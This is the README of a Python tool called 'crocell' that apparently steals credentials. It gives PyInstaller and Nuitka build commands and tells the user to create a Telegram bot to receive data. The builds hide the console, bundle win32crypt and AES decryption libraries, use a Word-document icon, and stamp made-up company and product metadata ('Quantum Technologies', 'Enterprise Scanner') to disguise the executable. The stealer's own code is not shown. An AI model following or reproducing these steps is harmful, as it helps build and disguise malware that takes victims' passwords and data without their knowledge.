# crocell

#note
 for pyinstaller all version of python supported and for nuitka only python 3.12.0
 and creat bot at botfather in te;igram and user useringo bot and get id and replase those 2 in python script 

```
pyinstaller --onefile --noconsole --name Crocell --icon=icon.ico --version-file=version.txt --hidden-import win32crypt --hidden-import Crypto.Cipher.AES --collect-all pycryptodome --collect-all pywin32 crocell.py

```
# py installler build code 


#  nuitka using minGW64
  ```
    py -3.12 -m venv venv312
   .\venv312\Scripts\Activate.ps1
   pip install nuitka
   pip install psutil requests pywin32 pycryptodome pillow python-telegram-bot

```

```
# Build with Nuitka
python -m nuitka `
    --standalone `
    --onefile `
    --mingw64 `
    --lto=yes `
    --windows-console-mode=disable `
    --enable-plugin=anti-bloat `
    --remove-output `
    --assume-yes-for-downloads `
    --windows-icon-from-ico=word.ico `
    --company-name="Quantum Technologies" `
    --product-name="Nexus" `
    --file-version=3.7.2.8451 `
    --product-version=3.7.2.8451 `
    --file-description="Enterprise Scanner" `
    --copyright="Copyright © 2025 Quantum Technologies" `
    --output-filename=crocell.exe `
    crocell.py


```
if want can use version infro from pyinstaller script much better then 


